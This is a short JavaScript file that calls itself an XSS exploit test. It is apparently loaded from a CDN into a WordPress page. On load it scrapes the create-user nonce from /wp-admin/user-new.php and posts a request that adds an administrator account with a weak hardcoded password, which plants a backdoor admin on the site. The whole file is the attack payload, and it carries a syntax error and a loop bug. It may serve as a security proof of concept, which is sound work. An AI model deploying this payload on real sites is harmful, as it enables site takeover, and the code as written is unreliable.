// this is a test for XSS exploit
// access link is : 
// https://cdn.jsdelivr.net/gh/user/repo@version/file
// https://cdn.jsdelivr.net/gh/IvanVernichenkoDevPro/AppSec@main/test.js

window.addEventListener("load", async (event) => {
	const url = "/wp-admin/user-new.php";
	
	var options_post = {
		method: "POST", 
		headers : { "Content-Type" : "application/x-www-form-urlencoded" }, 
		body : ""
	};
	
	var req = await fetch(url);
	var response = await req.text();
	
	const regx = /value=\"\d(\w|\d){9}\"/g;
	
	const nonce_values = regx.exec(response);
	
	if (nonce_values.length>0) {
		//processing every potential nonce found
		var nonce = "";
		for (var i=0; i < nonce_values.length; i++) {
			nonce = nonce_values[0].substr(7,10));
			console.log(`Processing nonce ${nonce}`);
		
			options_post.body = `action=createuser&_wpnonce_create-user=${nonce}&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=adminadmin&email=ivan.vernichenko%40dev.pro&first_name=&last_name=&url=&pass1=admin123&pass2=admin123&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User`;
			
			req = await fetch(url, options_post);
			
			console.log("add-user request finshed");
		}
	}
	
});
